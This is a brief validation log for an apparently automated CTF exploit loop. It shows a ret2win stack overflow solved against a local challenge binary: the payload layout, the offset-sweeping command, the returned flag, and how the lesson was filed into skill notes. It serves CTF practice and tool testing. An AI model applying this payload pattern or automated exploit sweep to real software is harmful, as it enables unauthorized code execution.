# Axe 2 validation — real ret2win solve

**Binary:** `/tmp/chal-ret2win/vuln` — x86_64 no-PIE no-canary, classic stack
BOF with `read(0, buf[64], 0x200)` and `win()` present.

**Exploit:** `/tmp/chal-ret2win/exploit.py` — takes `--offset` and `--local`,
sends `b"A"*offset + p64(ret) + p64(win)`.

**Loop invocation:**
```
python3 .../exploit_loop.py exploit.py --local .../vuln \
  --sweep-offset 80:56:-4 --attempts 20 --timeout-per-attempt 3 \
  --dir /tmp/chal-ret2win
```

**Result (< 2 s wall time, 3 attempts):**
```
[001] ran      hyp={'offset': 80}
[002] ran      hyp={'offset': 76}
[003] flag     hyp={'offset': 72}
{
  "attempts": 3, "crashes": 0, "flag_found": true,
  "flag": "CTF{real_ret2win_from_axe2_loop}",
  "time_elapsed_s": 1.45,
  "struggle_log": "/tmp/chal-ret2win/.struggle.jsonl",
  "learn_invoked": true
}
```

**Learn output:** skill=ctf-pwn, mechanic=ret2win, 3 drafts emitted
(`20260422T124401-ctf-pwn-ret2win.md` + pri-row + memory).

**Observation:** offsets 76/80 didn't crash because the read is non-lethal
when the overflow bytes happen to coincide with a valid return target (rip
stays in function prologue range). Even so, they are logged as tried
hypotheses, and `learn.py` captured them as anti-pattern dead-ends.

**Merged via review.sh:** yes, written into `ctf-pwn/quickref.md` +
`ctf-pwn/SKILL.md` PRI row. See MEMORY.md for the memory entry pointer.
